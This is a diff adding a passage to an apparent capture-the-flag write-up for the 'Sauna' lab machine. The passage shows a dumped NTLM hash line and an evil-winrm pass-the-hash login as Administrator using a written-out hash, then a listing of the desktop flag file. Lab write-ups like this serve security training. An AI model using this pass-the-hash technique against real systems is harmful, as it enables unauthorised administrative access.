@@ -185,6 +185,21 @@ SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:e972ec702fbffbeff010695dc5eed9dd:::
 ......etc........
 ```
 
+Used `evil-winrm` to get access to the root flag with admin hash:
+
+```bash
+evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir 
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/3/2024  10:44 AM             34 root.txt
+```
 
 
 
